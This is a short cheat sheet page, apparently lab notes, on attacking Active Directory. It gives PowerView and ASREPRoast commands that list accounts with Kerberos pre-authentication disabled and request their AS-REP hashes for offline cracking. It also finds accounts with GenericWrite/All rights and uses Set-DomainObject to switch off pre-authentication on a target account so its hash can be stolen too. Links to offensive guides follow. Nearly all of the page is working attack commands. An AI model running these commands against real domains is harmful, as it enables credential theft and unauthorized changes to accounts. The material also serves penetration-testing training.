---
layout: page
title: "# AD Pre Auth, AS-REP, GennericWrite/All"
permalink: /ad_cheatsheets/ad_preauth_asrep_genericwriteall
---

# AD Pre Auth, AS-REP, GennericWrite/All

## Enum Users With Kerberos Pre Auth Disabled

```powershell
. .\PowerView_dev.ps1

Get-DomainUser -PreauthNotRequired
```

## Request Hash

```powershell
. C:\AD\Tools\ASREPRoast-master\ASREPRoast-master\ASREPRoast.ps1

Get-ASREPHash -UserName VPN648user 
```

---

## Enum Users Who Has GenericWrite/All Right

```powershell
. .\PowerView_dev.ps1

Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```

## Force Set Preauth Not Required

```powershell
Set-DomainObject -Identity Control648User -XOR @{useraccountcontrol=4194304} -Verbose

Get-DomainUser -PreauthNotRequired -Identity Control648User
```

## Request Ticket

```powershell
Get-ASREPHash -UserName Control648User -Verbose
```

We can crack this ticket too.

[Abusing Active Directory ACLs/ACEs](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)

[AS-REP Roasting](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

[Abusing Active Directory ACLs/ACEs](https://book.hacktricks.xyz/windows/active-directory-methodology/acl-persistence-abuse)
